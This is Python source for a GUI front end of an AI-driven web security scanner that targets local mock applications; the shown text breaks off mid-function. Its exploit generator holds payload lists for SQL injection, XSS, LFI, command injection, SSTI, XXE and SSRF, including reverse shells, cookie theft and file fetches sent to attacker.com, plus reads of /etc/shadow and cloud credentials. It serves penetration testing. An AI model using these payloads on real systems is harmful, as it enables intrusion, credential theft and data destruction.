"""
AI-Powered Web Security Scanner - GUI Application
=================================================

Modern, accessible GUI for the security scanner with:
- Cyberpunk/Red Team Aesthetic
- Real-time logs & Progress tracking
- Exploit Generation
- Report Management

Usage:
    python scanner_gui.py
    python scanner_gui.py --auto --target http://localhost:5002
"""

import tkinter as tk
from tkinter import ttk, scrolledtext, filedialog, messagebox
import threading
import os
import sys
import glob
import json
import argparse
import time
import subprocess
import urllib.parse
from datetime import datetime

# Add parent directory to path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from autonomous_scan import SecurityAuditor, Finding
from utils.vulnerability_database import VULNERABILITY_DATABASE
from utils.model_loader import find_latest_checkpoint
import webbrowser


TARGET_PRESETS = [
    ("Custom / Manual", ""),
    ("E-Commerce Platform", "http://localhost:5002"),
    ("Social Media Platform", "http://localhost:5003"),
    ("Banking Application", "http://localhost:5004"),
    ("Blog Platform", "http://localhost:5005"),
    ("File Sharing Platform", "http://localhost:5006"),
]

SCAN_PROFILES = [
    (
        "Hybrid",
        {
            "depth": 30,
            "intensity": 3,
            "persist": True,
            "ai_mode": False,
            "pentester": False,
            "description": "Scripted recon + AI testing (balanced).",
            "apply": True,
        },
    ),
    (
        "Full AI",
        {
            "depth": 50,
            "intensity": 8,
            "persist": True,
            "ai_mode": True,
            "pentester": True,
            "description": "AI recon + chain attacks + online learning.",
            "apply": True,
        },
    ),
]


class ToolTip(object):
    """
    create a tooltip for a given widget
    """

    def __init__(self, widget, text="widget info"):
        self.wait_time = 500  # miliseconds
        self.wrap_length = 180  # pixels
        self.widget = widget  # FIX: Assign widget to self.widget
        self.text = text
        self.widget.bind("<Enter>", self.enter)
        self.widget.bind("<Leave>", self.leave)
        self.widget.bind("<ButtonPress>", self.leave)
        self.id = None
        self.tw = None

    def enter(self, event=None):
        self.schedule()

    def leave(self, event=None):
        self.unschedule()
        self.hidetip()

    def schedule(self):
        self.unschedule()
        self.id = self.widget.after(self.wait_time, self.showtip)

    def unschedule(self):
        id = self.id
        self.id = None
        if id:
            self.widget.after_cancel(id)

    def showtip(self, event=None):
        x = self.widget.winfo_rootx() + 25
        y = self.widget.winfo_rooty() + 20
        try:
            bbox = self.widget.bbox("insert")
        except tk.TclError:
            bbox = None
        if bbox:
            x, y, _, _ = bbox
            x += self.widget.winfo_rootx() + 25
            y += self.widget.winfo_rooty() + 20
        # creates a toplevel window
        self.tw = tk.Toplevel(self.widget)
        # Leaves only the label and removes the app window
        self.tw.wm_overrideredirect(True)
        self.tw.wm_geometry("+%d+%d" % (x, y))
        label = tk.Label(
            self.tw,
            text=self.text,
            justify="left",
            background="#ffffff",
            relief="solid",
            borderwidth=1,
            wraplength=self.wrap_length,
        )
        label.pack(ipadx=1)

    def hidetip(self):
        tw = self.tw
        self.tw = None
        if tw:
            tw.destroy()


class ExploitGenerator:
    """Generates ready-to-use exploits from vulnerability data"""

    @staticmethod
    def generate_curl(vuln):
        """Generate a curl command for the exploit"""
        url = vuln.get("url", "http://target.com")
        method = vuln.get("method", "GET")
        payload = vuln.get("payload", "")
        param = vuln.get("parameter", "q")

        if method == "GET":
            separator = "&" if "?" in url else "?"
            if "=" in payload:
                full_url = f"{url}{separator}{payload}"
            else:
                full_url = f"{url}{separator}{param}={payload}"
            return f"curl -v '{full_url}'"

        elif method == "POST":
            if "=" in payload or "{" in payload:
                data = payload
            else:
                data = f"{param}={payload}"
            return f"curl -v -X POST '{url}' -d '{data}'"

        return f"# Method {method} not supported for auto-generation"

    @staticmethod
    def generate_python(vuln):
        """Generate a Python script for the exploit"""
        url = vuln.get("url", "http://target.com")
        method = vuln.get("method", "GET")
        payload = vuln.get("payload", "")
        param = vuln.get("parameter", "q")

        script = f"""import requests

target_url = "{url}"
payload = "{payload}"

print(f"[*] Exploiting {vuln.get('type', 'Vulnerability')}...")
"""
        if method == "GET":
            if "=" in payload:
                script += f"""
full_url = f"{{target_url}}?{{payload}}" if "?" not in target_url else f"{{target_url}}&{{payload}}"
response = requests.get(full_url)
"""
            else:
                script += f"""
params = {{'{param}': payload}}
response = requests.get(target_url, params=params)
"""
        elif method == "POST":
            script += f"""
data = payload 
response = requests.post(target_url, data=data, headers={{'Content-Type': 'application/x-www-form-urlencoded'}})
"""
        script += """
print(f"[*] Status Code: {response.status_code}")
if response.status_code == 200:
    print("[+] Exploit sent successfully!")
else:
    print("[-] Server returned error.")
"""
        return script

    @staticmethod
    def get_steps(vuln):
        """Get step-by-step hacking instructions"""
        v_type = vuln.get("type", "Unknown")

        steps = {
            "SQL": [
                "1. Identify the vulnerable parameter.",
                "2. Inject SQL payload to manipulate query.",
                "3. Check for database errors or data leakage.",
                "4. Dump database with UNION SELECT.",
            ],
            "XSS": [
                "1. Find reflection point.",
                "2. Inject script payload.",
                "3. Verify execution (alert box).",
                "4. Steal cookies or redirect users.",
            ],
            "OSINT": [
                "1. Analyze the exposed file.",
                "2. Look for secrets, keys, or config data.",
                "3. Use data to pivot to other systems.",
            ],
            "Upload": [
                "1. Upload a malicious file (e.g., PHP shell).",
                "2. Access the file via the web server.",
                "3. Execute commands on the server.",
            ],
            "Prototype": [
                "1. Inject __proto__ or constructor payload.",
                "2. Check if object properties are modified.",
                "3. Escalate to RCE or DoS.",
            ],
            "XXE": [
                "1. Inject XML with DOCTYPE definition.",
                "2. Reference external entity (e.g., /etc/passwd).",
                "3. Check response for file content.",
            ],
            "SSRF": [
                "1. Inject internal URL (localhost, 127.0.0.1).",
                "2. Check if server fetches the internal resource.",
                "3. Scan internal ports or metadata services.",
            ],
            "Deserialization": [
                "1. Identify serialized object (base64, etc.).",
                "2. Generate malicious object (ysoserial).",
                "3. Inject and execute code.",
            ],
        }

        for key in steps:
            if key.lower() in v_type.lower():
                return "\n".join(steps[key])

        return "1. Analyze request.\n2. Replay with payload.\n3. Verify impact.\n4. Report finding."

    @staticmethod
    def get_suggested_payloads(vuln_type):
        """Returns a list of payloads to try manually."""
        payloads = {
            "SQL": [
                "' OR 1=1 --",
                "' OR '1'='1",
                "admin' --",
                "' UNION SELECT 1, version(), user() --",
                "1' ORDER BY 10 --",
                "' AND 1=2 UNION SELECT NULL, NULL, NULL--",
                "1' AND SLEEP(5)--",
                "1' WAITFOR DELAY '00:00:05'--",
                "' OR 'x'='x",
                "1'; DROP TABLE users--",
                "' UNION SELECT NULL, table_name FROM information_schema.tables--",
                "' UNION SELECT username, password FROM users--",
                "admin'/*",
                "' OR 1=1#",
                "1' AND extractvalue(1,concat(0x7e,version()))--",
            ],
            "XSS": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert(1)>",
                '"><script>alert(1)</script>',
                "javascript:alert(1)",
                "<svg/onload=alert(1)>",
                "<iframe src=javascript:alert(1)>",
                "<body onload=alert(1)>",
                "<input onfocus=alert(1) autofocus>",
                "<select onfocus=alert(1) autofocus>",
                "<textarea onfocus=alert(1) autofocus>",
                "<marquee onstart=alert(1)>",
                "<details open ontoggle=alert(1)>",
                "<img src=x onerror=fetch('http://attacker.com?c='+document.cookie)>",
                "'-alert(1)-'",
                '";alert(1);//',
                "<script>eval(atob('YWxlcnQoMSk='))</script>",
                "{{constructor.constructor('alert(1)')()}}",
                "<img src=x:alert(1) onerror=eval(src)>",
            ],
            "LFI": [
                "../../../../etc/passwd",
                "....//....//....//etc/passwd",
                "php://filter/convert.base64-encode/resource=index.php",
                "..\\..\\..\\..\\windows\\win.ini",
                "/etc/passwd%00",
                "....//....//....//etc/shadow",
                "php://input",
                "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
                "expect://id",
                "file:///etc/passwd",
                "php://filter/read=string.rot13/resource=index.php",
                "/proc/self/environ",
                "/var/log/apache2/access.log",
                "....//....//....//var/www/html/config.php",
            ],
            "Command": [
                "; id",
                "| whoami",
                "$(cat /etc/passwd)",
                "& ping -c 1 127.0.0.1",
                "`id`",
                "; ls -la",
                "| cat /etc/passwd",
                "&& cat /etc/shadow",
                "; wget http://attacker.com/shell.sh",
                "| nc attacker.com 4444 -e /bin/bash",
                "; curl http://attacker.com/$(whoami)",
                "& powershell -c Get-Process",
                "; bash -i >& /dev/tcp/attacker.com/4444 0>&1",
            ],
            "SSTI": [
                "{{7*7}}",
                "${7*7}",
                "<%= 7*7 %>",
                "{{config}}",
                "{{self}}",
                "{{''.__class__.__mro__[1].__subclasses__()}}",
                "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
                "${T(java.lang.Runtime).getRuntime().exec('calc')}",
                "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
                "{{config.items()}}",
                "{{''.class.mro()[1].subclasses()}}",
                "{{request.environ}}",
            ],
            "Prototype": [
                "__proto__[admin]=true",
                "constructor[prototype][isAdmin]=true",
                "__proto__.polluted=true",
                "constructor.prototype.admin=true",
                "__proto__[role]=admin",
                "?__proto__[admin]=true",
                '{"__proto__":{"admin":true}}',
                "constructor[prototype][authenticated]=true",
            ],
            "XXE": [
                "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
                "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///c:/windows/win.ini'>]><foo>&xxe;</foo>",
                "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://attacker.com/xxe'>]><foo>&xxe;</foo>",
                "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'file:///etc/passwd'><!ENTITY % dtd SYSTEM 'http://attacker.com/evil.dtd'>%dtd;]>",
                "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=index.php'>]><foo>&xxe;</foo>",
            ],
            "SSRF": [
                "http://localhost:80",
                "http://127.0.0.1:22",
                "http://169.254.169.254/latest/meta-data/",
                "http://localhost:3306",
                "http://127.0.0.1:6379",
                "http://[::1]:80",
                "http://0.0.0.0:80",
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "file:///etc/passwd",
                "gopher://127.0.0.1:6379/_FLUSHALL",
                "dict://localhost:11211/stat",
            ],
            "Deserialization": [
                "rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldL... (Java)",
                "Tzo0OiJVc2VyIjoyOntzOjQ6Im5hbWUi... (PHP)",
                "YToxOntzOjQ6InVzZXIiO3M6NToiYWRtaW4iO30= (PHP Base64)",
                "Use ysoserial for Java payloads",
                "Use phpggc for PHP gadget chains",
            ],
            "CSRF": [
                "<html><form action='http://target/change' method='POST'><input name='password' value='hacked'/></form><script>document.forms[0].submit()</script></html>",
                "<img src='http://target/delete?id=1'>",
                "<iframe src='http://target/admin/deleteUser?id=1'></iframe>",
            ],
            "Path": [
                "../../../../etc/passwd",
                "..\\..\\..\\windows\\win.ini",
                "....//....//etc/passwd",
                "..%2F..%2F..%2Fetc%2Fpasswd",
                "..%252F..%252F..%252Fetc%252Fpasswd",
                "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            ],
            "IDOR": [
                "?id=1 (try id=2, id=999, id=admin)",
                "?user_id=123 (try other IDs)",
                "?document=abc123 (try other UUIDs)",
                "/api/users/1 (try /api/users/2)",
            ],
            "Upload": [
                "shell.php (PHP web shell)",
                "shell.jsp (Java web shell)",
                "shell.aspx (ASP.NET web shell)",
                "image.php.jpg (double extension)",
                "shell.php%00.jpg (null byte)",
                "Use polyglot files (valid image + PHP code)",
            ],
            "NoSQL": [
                "{'$ne': null}",
                "{'$gt': ''}",
                "admin' || '1'=='1",
                "{'$regex': '.*'}",
                "{'username': {'$ne': null}, 'password': {'$ne': null}}",
            ],
            "LDAP": [
                "*",
                "admin)(&(password=*))",
                "*)(&(objectClass=*)",
                "admin)(|(password=*))",
            ],
            "OAuth": [
                "redirect_uri=http://attacker.com",
                "response_type=token",
                "state= (CSRF token bypass)",
            ],
        }

        for key, p_list in payloads.items():
            if key.lower() in vuln_type.lower():
                return "\n".join([f"- {p}" for p in p_list])

        return "- (No specific payloads available for this type)"


class SecurityScannerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("💀 DRL AI RED TEAM - AGENT 2.0 (OWASP 2025)")
        self.root.geometry("1920x1080")  # Increased default size
        self.root.minsize(1280, 720)  # Increased minimum size to prevent content cutoff

        # Modern Security Suite Theme
        self.colors = {
            "bg_dark": "#08080C",  # Midnight Dark
            "bg_panel": "#12121A",  # Deep Cobalt Dark
            "accent": "#00E5FF",  # Electric Cyan
            "accent_dim": "#00B8D4",  # Dim Cyan
            "text": "#E0E0E0",  # Off-White Text
            "text_dim": "#90A4AE",  # Blue-Grey Text
            "danger": "#FF1744",  # Modern Red
            "warning": "#FFC400",  # Amber
            "success": "#00C853",  # Emerald Green
            "highlight": "#1C1C26",  # Subtle Highlight
        }

        self.root.configure(bg=self.colors["bg_dark"])

        # Variables
        self.target_url = tk.StringVar(value="http://localhost:5002")
        self.target_preset = tk.StringVar(value=TARGET_PRESETS[1][0])
        self.scan_profile = tk.StringVar(value=SCAN_PROFILES[0][0])
        self.crawl_depth = tk.IntVar(value=30)
        self.test_episodes = tk.IntVar(value=3)
        self.persist_mode = tk.BooleanVar(value=True)  # Default to Persistence Mode
        self.pentester_mode = tk.BooleanVar(value=False)
        self.target_entry = None
        self.last_live_view_update = 0.0
        self.live_view_warned = False
        self.live_view_watchdog_id = None
        self.is_scanning = False
        # Find latest model automatically
        latest_ep, latest_model_path = find_latest_checkpoint()
        default_model = (
            latest_model_path
            if latest_model_path
            # No checkpoint found at all (fresh clone, training not started
            # yet) -- fall back to the generic base-model path rather than
            # a hardcoded episode-numbered checkpoint filename that may not
            # exist. Matches utils/model_loader.py's own fallback.
            else "dqn_web_sec_model.pth"
        )

        self.model_path = tk.StringVar(value=default_model)

        self.setup_ui()
        self.load_available_models()
        self.auditor = None

    def setup_ui(self):
        """Setup the Cyberpunk UI with Responsive Layout"""

        # Custom Style for Progress Bar
        style = ttk.Style()
        style.theme_use("clam")
        style.configure(
            "Horizontal.TProgressbar",
            foreground=self.colors["accent"],
            background=self.colors["accent"],
            troughcolor=self.colors["bg_panel"],
            bordercolor=self.colors["bg_panel"],
            lightcolor=self.colors["accent"],
            darkcolor=self.colors["accent"],
        )

        # Header
        header_frame = tk.Frame(self.root, bg=self.colors["bg_dark"], height=70)
        header_frame.pack(fill=tk.X, padx=0, pady=0)
        header_frame.pack_propagate(False)

        title_label = tk.Label(
            header_frame,
            text="DRL AI RED TEAM",
            font=("Segoe UI", 24, "bold"),
            bg=self.colors["bg_dark"],
            fg=self.colors["accent"],
        )
        title_label.pack(side=tk.LEFT, padx=20, pady=10)

        subtitle_label = tk.Label(
            header_frame,
            text="AUTONOMOUS EXPLOITATION FRAMEWORK",
            font=("Segoe UI", 10, "bold"),
            bg=self.colors["bg_dark"],
            fg=self.colors["text_dim"],
        )
        subtitle_label.pack(side=tk.LEFT, pady=10)

        # Status Bar (Top Right)
        self.status_var = tk.StringVar()
        self.status_var.set("SYSTEM READY")
        self.status_label = tk.Label(
            header_frame,
            textvariable=self.status_var,
            font=("Consolas", 10),
            bg=self.colors["bg_dark"],
            fg=self.colors["accent"],
        )
        self.status_label.pack(side=tk.RIGHT, padx=20)

        # Main Layout - PanedWindow for Resizability
        main_pane = tk.PanedWindow(
            self.root,
            bg=self.colors["bg_dark"],
            orient=tk.HORIZONTAL,
            sashwidth=4,
            sashrelief=tk.FLAT,
        )
        main_pane.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        # === LEFT: MISSION CONTROL (Scrollable) ===
        left_container = tk.Frame(main_pane, bg=self.colors["bg_panel"])
        main_pane.add(left_container, minsize=320, width=350)

        # Canvas for scrolling
        self.canvas = tk.Canvas(
            left_container, bg=self.colors["bg_panel"], highlightthickness=0
        )
        self.scrollbar = ttk.Scrollbar(
            left_container, orient="vertical", command=self.canvas.yview
        )
        self.scrollable_frame = tk.Frame(self.canvas, bg=self.colors["bg_panel"])

        self.scrollable_frame.bind(
            "<Configure>",
            lambda e: self.canvas.configure(scrollregion=self.canvas.bbox("all")),
        )

        # Create window without fixed width - will resize dynamically
        self.canvas_window = self.canvas.create_window(
            (0, 0), window=self.scrollable_frame, anchor="nw"
        )

        # Bind canvas resize to update scrollable frame width
        def on_canvas_resize(event):
            self.canvas.itemconfig(self.canvas_window, width=event.width)

        self.canvas.bind("<Configure>", on_canvas_resize)
        self.canvas.configure(yscrollcommand=self.scrollbar.set)

        # Enable mousewheel scrolling
        def on_mousewheel(event):
            self.canvas.yview_scroll(int(-1 * (event.delta / 120)), "units")

        self.canvas.bind_all("<MouseWheel>", on_mousewheel)

        self.canvas.pack(side="left", fill="both", expand=True)
        self.scrollbar.pack(side="right", fill="y")

        # --- Control Widgets in Scrollable Frame ---
        self.add_section_header(self.scrollable_frame, "MISSION PARAMETERS")
        self.create_target_selector(self.scrollable_frame)
        self.target_entry = self.create_input_field(
            self.scrollable_frame,
            "TARGET URL:",
            self.target_url,
            "http://localhost:5002",
        )
        self.create_profile_selector(self.scrollable_frame)
        self.create_slider_field(
            self.scrollable_frame,
            "CRAWL DEPTH:",
            self.crawl_depth,
            0,
            100,
            30,
            "0 = Only target URL (no crawl), 30 for new sites, 100+ for deep scan",
        )
        self.create_slider_field(
            self.scrollable_frame,
            "ATTACK INTENSITY:",
            self.test_episodes,
            1,
            50,
            10,
            "Rec: 2 for new sites, 3 standard, 5 aggressive, 20+ for deep skill check",
        )
        self.create_model_selector(self.scrollable_frame)

        # Persistence Checkbox
        persist_frame = tk.Frame(self.scrollable_frame, bg=self.colors["bg_panel"])
        persist_frame.pack(pady=5, padx=15, fill=tk.X)
        tk.Checkbutton(
            persist_frame,
            text="ENABLE PERSISTENCE MODE (Retry until found)",
            variable=self.persist_mode,
            bg=self.colors["bg_panel"],
            fg=self.colors["accent"],
            selectcolor=self.colors["bg_dark"],
            activebackground=self.colors["bg_panel"],
            activeforeground=self.colors["accent"],
            font=("Segoe UI", 9, "bold"),
        ).pack(anchor=tk.W)

        self.apply_scan_profile(self.scan_profile.get())

        tk.Frame(
            self.scrollable_frame, bg=self.colors["bg_panel"], height=20
        ).pack()  # Spacer

        # SCAN CONTROL
        self.scan_button = tk.Button(
            self.scrollable_frame,
            text="START SCAN",
            font=("Segoe UI", 11, "bold"),
            bg=self.colors["highlight"],
            fg=self.colors["accent"],
            relief=tk.FLAT,
            cursor="hand2",
            command=self.start_scan,
            height=2,
        )
        ToolTip(
            self.scan_button,
            "Run the selected scan mode (Hybrid or Full AI)",
        )
        self.scan_button.pack(pady=5, padx=15, fill=tk.X)

        self.stop_button = tk.Button(
            self.scrollable_frame,
            text="ABORT MISSION",
            font=("Segoe UI", 11, "bold"),
            bg=self.colors["danger"],
            fg="white",
            relief=tk.FLAT,
            cursor="hand2",
            command=self.stop_scan,
            height=2,
            state=tk.DISABLED,
        )
        self.stop_button.pack(pady=(5, 15), padx=15, fill=tk.X)

        # === MIDDLE: TERMINAL & INTEL ===
        middle_panel = tk.Frame(main_pane, bg=self.colors["bg_panel"])
        main_pane.add(middle_panel, minsize=400, width=500)

        # Split Middle Panel Vertically
        middle_pane_vertical = tk.PanedWindow(
            middle_panel,
            bg=self.colors["bg_panel"],
            orient=tk.VERTICAL,
            sashwidth=4,
            sashrelief=tk.FLAT,
        )
        middle_pane_vertical.pack(fill=tk.BOTH, expand=True)

        # Terminal Section (Now wrapped in a Notebook)
        terminal_notebook = ttk.Notebook(middle_pane_vertical)
        middle_pane_vertical.add(terminal_notebook, minsize=200, height=300)

        # Tab 1: Terminal
        terminal_frame = tk.Frame(terminal_notebook, bg=self.colors["bg_panel"])
        terminal_notebook.add(terminal_frame, text="LOGS & TERMINAL")

        self.add_section_header(terminal_frame, "LIVE ACTION TERMINAL")
        self.progress = ttk.Progressbar(
            terminal_frame, mode="indeterminate", style="Horizontal.TProgressbar"
        )
        self.progress.pack(pady=5, padx=15, fill=tk.X)

        self.output_text = scrolledtext.ScrolledText(
            terminal_frame,
            wrap=tk.WORD,
            font=("Consolas", 9),
            bg="black",
            fg=self.colors["text"],
            relief=tk.FLAT,
            insertbackground=self.colors["accent"],
        )
        self.output_text.pack(pady=10, padx=15, fill=tk.BOTH, expand=True)

        # Tab 2: Live View (AI Vision)
        live_view_frame = tk.Frame(terminal_notebook, bg=self.colors["bg_panel"])
        terminal_notebook.add(live_view_frame, text="LIVE VIEW (AI VISION)")

        self.add_section_header(live_view_frame, "REAL-TIME AGENT PERCEPTION")

        self.live_view_text = scrolledtext.ScrolledText(
            live_view_frame,
            wrap=tk.NONE,
            font=("Consolas", 8),
            bg="#1e1e1e",
            fg="#00ff00",
            relief=tk.FLAT,
            insertbackground="white",
        )
        self.live_view_text.pack(pady=10, padx=15, fill=tk.BOTH, expand=True)
        self.live_view_text.insert(tk.END, "Waiting for agent visual input...\n")

        # Findings Section
        findings_frame_container = tk.Frame(
            middle_pane_vertical, bg=self.colors["bg_panel"]
        )
        middle_pane_vertical.add(findings_frame_container, minsize=200)

        self.add_section_header(findings_frame_container, "THREAT DETECTION ENGINE")

        findings_list_frame = tk.Frame(findings_frame_container, bg="black")
        findings_list_frame.pack(pady=10, padx=15, fill=tk.BOTH, expand=True)

        scrollbar_findings = tk.Scrollbar(findings_list_frame)
        scrollbar_findings.pack(side=tk.RIGHT, fill=tk.Y)

        self.findings_list = tk.Listbox(
            findings_list_frame,
            font=("Consolas", 10),
            bg="black",
            fg=self.colors["warning"],
            selectbackground=self.colors["accent"],
            selectforeground="black",
            relief=tk.FLAT,
            yscrollcommand=scrollbar_findings.set,
        )
        self.findings_list.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar_findings.config(command=self.findings_list.yview)

        self.findings_list.bind("<<ListboxSelect>>", self.on_finding_select)

        # === RIGHT: WEAPONIZATION ===
        right_panel = tk.Frame(main_pane, bg=self.colors["bg_panel"])
        main_pane.add(right_panel, minsize=350, width=400)

        self.add_section_header(right_panel, "WEAPONIZATION MODULE")

        self.exploit_text = scrolledtext.ScrolledText(
            right_panel,
            wrap=tk.WORD,
            font=("Consolas", 10),
            bg="black",
            fg=self.colors["danger"],
            relief=tk.FLAT,
            insertbackground="white",
        )
        self.exploit_text.pack(pady=10, padx=15, fill=tk.BOTH, expand=True)
        self.exploit_text.insert(
            tk.END, "// Select a vulnerability to generate exploit payload..."
        )

        btn_frame = tk.Frame(right_panel, bg=self.colors["bg_panel"])
        btn_frame.pack(pady=10, padx=15, fill=tk.X)

        self.copy_btn = tk.Button(
            btn_frame,
            text="📋 COPY PAYLOAD",
            bg=self.colors["highlight"],
            fg="white",
            relief=tk.FLAT,
            command=self.copy_exploit,
        )
        self.copy_btn.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5))

        self.view_report_btn = tk.Button(
            btn_frame,
            text="📄 OPEN REPORT",
            bg=self.colors["highlight"],
            fg="white",
            relief=tk.FLAT,
            command=self.view_report,
            state=tk.DISABLED,
        )
        self.view_report_btn.pack(side=tk.RIGHT, fill=tk.X, expand=True, padx=(5, 0))

    # toggle_attack_selector removed - no longer needed

    def add_section_header(self, parent, text):
        tk.Label(
            parent,
            text=text,
            font=("Segoe UI", 11, "bold"),
            bg=self.colors["bg_panel"],
            fg=self.colors["accent"],
        ).pack(pady=(20, 10), padx=15, anchor=tk.W)

    def create_target_selector(self, parent):
        frame = tk.Frame(parent, bg=self.colors["bg_panel"])
        frame.pack(pady=8, padx=15, fill=tk.X)
        tk.Label(
            frame,
            text="TARGET PRESET:",
            font=("Segoe UI", 9, "bold"),
            bg=self.colors["bg_panel"],
            fg=self.colors["text_dim"],
        ).pack(anchor=tk.W)

        self.target_combo = ttk.Combobox(
            frame, textvariable=self.target_preset, state="readonly"
        )
        self.target_combo["values"] = [name for name, _ in TARGET_PRESETS]
        self.target_combo.pack(fill=tk.X, pady=(5, 0))
        self.target_combo.bind("<<ComboboxSelected>>", self.on_target_preset_change)
        ToolTip(
            self.target_combo,
            "Quick select a mock target. Use Custom for manual entry.",
        )
        self.on_target_preset_change()

    def create_profile_selector(self, parent):
        frame = tk.Frame(parent, bg=self.colors["bg_panel"])
        frame.pack(pady=8, padx=15, fill=tk.X)
        tk.Label(
            frame,
            text="SCAN MODE:",
            font=("Segoe UI", 9, "bold"),
            bg=self.colors["bg_panel"],
            fg=self.colors["text_dim"],
        ).pack(anchor=tk.W)

        self.profile_combo = ttk.Combobox(
            frame, textvariable=self.scan_profile, state="readonly"
        )
        self.profile_combo["values"] = [name for name, _ in SCAN_PROFILES]
        self.profile_combo.pack(fill=tk.X, pady=(5, 0))
        self.profile_combo.bind("<<ComboboxSelected>>", self.on_profile_change)

        self.profile_hint = tk.Label(
            frame,
            text="",
            font=("Segoe UI", 8),
            bg=self.colors["bg_panel"],
            fg=self.colors["text_dim"],
            wraplength=280,
            justify="left",
        )
        self.profile_hint.pack(anchor=tk.W, pady=(4, 0))

    def on_target_preset_change(self, event=None):
        selected = self.target_preset.get()
        for name, url in TARGET_PRESETS:
            if name == selected:
                if url:
                    self.target_url.set(url)
                break

    def on_profile_change(self, event=None):
        self.apply_scan_profile(self.scan_profile.get())

    def _get_scan_profile_config(self, profile_name):
        for name, config in SCAN_PROFILES:
            if name == profile_name:
                return config
        return {}

    def apply_scan_profile(self, profile_name):
        config = self._get_scan_profile_config(profile_name)
        description = config.get("description", "")
        if hasattr(self, "profile_hint"):
            self.profile_hint.config(text=description)

        if config.get("apply"):
            if "depth" in config:
                self.crawl_depth.set(config["depth"])
            if "intensity" in config:
                self.test_episodes.set(config["intensity"])
            if "persist" in config:
                self.persist_mode.set(config["persist"])
            if "pentester" in config:
                self.pentester_mode.set(config["pentester"])


    def create_input_field(self, parent, label_text, variable, placeholder):
        frame = tk.Frame(parent, bg=self.colors["bg_panel"])
        frame.pack(pady=8, padx=15, fill=tk.X)
        tk.Label(
            frame,
            text=label_text,
            font=("Segoe UI", 9, "bold"),
            bg=self.colors["bg_panel"],
            fg=self.colors["text_dim"],
        ).pack(anchor=tk.W)
        entry = tk.Entry(
            frame,
            textvariable=variable,
            font=("Segoe UI", 10),
            bg="#000000",
            fg="white",
            relief=tk.FLAT,
            insertbackground="white",
            borderwidth=1,
        )
        entry.pack(fill=tk.X, ipady=8, pady=(5, 0))
        if not variable.get() and placeholder:
            entry.insert(0, placeholder)
        ToolTip(entry, f"Enter the {label_text.lower().replace(':', '')} here")
        return entry

    def create_slider_field(
        self, parent, label_text, variable, from_, to, default, tooltip_text=None
    ):
        frame = tk.Frame(parent, bg=self.colors["bg_panel"])
        frame.pack(pady=8, padx=15, fill=tk.X)
        tk.Label(
            frame,
            text=label_text,
            font=("Segoe UI", 9, "bold"),
            bg=self.colors["bg_panel"],
            fg=self.colors["text_dim"],
        ).pack(anchor=tk.W)
        tk.Scale(
            frame,
            from_=from_,
            to=to,
            orient=tk.HORIZONTAL,
            variable=variable,
            bg=self.colors["bg_panel"],
            fg=self.colors["accent"],
            troughcolor="#000000",
            showvalue=True,
            highlightthickness=0,
            font=("Segoe UI", 8),
        ).pack(fill=tk.X)
        variable.set(default)
        if tooltip_text:
            ToolTip(frame, tooltip_text)
        else:
            ToolTip(frame, f"Adjust {label_text.lower().replace(':', '')}")

    def create_model_selector(self, parent):
        frame = tk.Frame(parent, bg=self.colors["bg_panel"])
        frame.pack(pady=5, padx=15, fill=tk.X)
        tk.Label(
            frame,
            text="BRAIN MODEL:",
            font=("Courier New", 9, "bold"),
            bg=self.colors["bg_panel"],
            fg=self.colors["text"],
        ).pack(anchor=tk.W)

        combo_frame = tk.Frame(frame, bg=self.colors["bg_panel"])
        combo_frame.pack(fill=tk.X)

        self.model_combo = ttk.Combobox(
            combo_frame, textvariable=self.model_path, state="readonly"
        )
        self.model_combo.pack(side=tk.LEFT, fill=tk.X, expand=True)

        browse_btn = tk.Button(
            combo_frame,
            text="📂",
            font=("Consolas", 8),
            command=self.browse_model,
            bg=self.colors["highlight"],
            fg="white",
            relief=tk.FLAT,
            width=3,
        )
        browse_btn.pack(side=tk.RIGHT, padx=(5, 0))

    def browse_model(self):
        filename = filedialog.askopenfilename(
            initialdir="checkpoints",
            title="Select Model File",
            filetypes=(("PyTorch Models", "*.pth"), ("All Files", "*.*")),
        )
        if filename:
            self.model_path.set(filename)

    def load_available_models(self):
        models = []
        # Main models
        main_models = ["dqn_web_sec_model.pth", "dqn_juiceshop_model.pth"]
        for m in main_models:
            if os.path.exists(m):
                models.append(m)

        # Checkpoints -- current active naming first, then ablation-study
        # checkpoints (so a specific variant/seed can be picked for manual
        # comparison), then old-naming patterns kept for backward
        # compatibility with anyone who still has pre-2026-08-09 checkpoints
        # lying around (harmless if these don't match anything).
        checkpoints = (
            glob.glob("checkpoints/d3qn_primary_3k_ep*.pth")
            + glob.glob("checkpoints/ablation/*.pth")
            + glob.glob("checkpoints/improved_mock_ep*.pth")
            + glob.glob("checkpoints/dqn_checkpoint_ep*.pth")
            + glob.glob("checkpoints/multi_target_*.pth")
        )

        # Add discovered checkpoints
        for cp in sorted(checkpoints, reverse=True):
            normalized_path = cp.replace("\\", "/")
            if normalized_path not in models:
                models.append(normalized_path)

        if models:
            self.model_combo["values"] = models
            # Set to the current selected model if valid
            current = self.model_path.get().replace("\\", "/")
            if current in models:
                self.model_combo.set(current)
            else:
                self.model_combo.current(0)
                self.model_path.set(models[0])
        else:
            self.model_combo["values"] = ["No models found"]
            self.model_combo.current(0)

    def log(self, message, level="INFO"):
        timestamp = datetime.now().strftime("%H:%M:%S")
        prefix = (
            "[+]"
            if level == "SUCCESS"
            else "[-]" if level == "ERROR" else "[!]" if level == "WARNING" else "[*]"
        )
        color = (
            self.colors["accent"]
            if level == "SUCCESS"
            else (
                self.colors["danger"]
                if level == "ERROR"
                else (
